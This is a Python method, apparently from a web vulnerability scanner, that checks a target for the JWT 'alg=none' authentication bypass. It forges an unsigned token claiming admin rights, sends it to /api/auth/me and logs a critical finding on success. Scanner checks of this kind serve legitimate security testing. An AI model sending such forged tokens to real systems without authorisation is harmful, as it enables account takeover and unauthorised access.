    def test_cat241_jwt_alg_none_00(self):
        """JWT alg=none bypass at /api/auth/me."""
        if not self.deep: return
        self._print("[*]", "test_cat241_jwt_alg_none_00...", "INFO")
        try:
            hdr = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
            pl = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}).encode()).rstrip(b'=').decode()
            tok = hdr + '.' + pl + '.'
            r = self._get(urljoin(self.target, "/api/auth/me"), headers={'Authorization': 'Bearer ' + tok}, timeout=8)
            if r is not None and r.status_code == 200:
                self._add_vuln("JWT alg=none Bypass", "CRITICAL", urljoin(self.target, "/api/auth/me"), "alg=none bypass at /api/auth/me: " + tok)
        except Exception:
            pass

